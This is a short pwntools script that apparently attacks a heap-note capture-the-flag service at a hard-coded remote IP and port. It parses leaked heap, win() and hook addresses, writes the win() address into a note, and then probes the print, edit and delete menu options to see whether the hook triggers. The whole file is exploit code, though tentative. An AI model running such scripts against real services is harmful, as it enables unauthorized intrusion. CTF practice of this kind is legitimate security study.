#!/usr/bin/env python3
from pwn import *

io = remote('212.2.250.33', 32384)

# Get addresses
banner = io.recvuntil(b'>')
import re
heap = int(re.search(rb'heap\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
win = int(re.search(rb'win\(\)\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
hook = int(re.search(rb'hook\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)

print(f"[+] heap: 0x{heap:x}, win: 0x{win:x}, hook: 0x{hook:x}")

# Simple test: create a note at exact offset to overwrite hook
# Calculate: we need a note whose data section is at hook address

# First, let's see what happens if we just write win() address somewhere
# and hope it gets called

# Create note
io.sendline(b'1')
io.sendlineafter(b':', b'32')
# Write win() address multiple times
io.sendlineafter(b':', p64(win) * 4)
io.recvuntil(b'>')

# Try print - maybe hook is called during print?
print("[*] Testing print...")
io.sendline(b'4')
io.sendlineafter(b':', b'0')
output = io.recvuntil(b'>', timeout=2)
print(output.decode(errors='ignore'))

# Try edit - maybe hook is called during edit?
print("[*] Testing edit...")
io.sendline(b'2')
io.sendlineafter(b':', b'0')
io.sendlineafter(b':', p64(win))
output = io.recvuntil(b'>', timeout=2)
print(output.decode(errors='ignore'))

# Try delete - maybe hook is called during delete?
print("[*] Testing delete...")
io.sendline(b'3')
io.sendlineafter(b':', b'0')
output = io.recvall(timeout=2)
print(output.decode(errors='ignore'))

io.close()
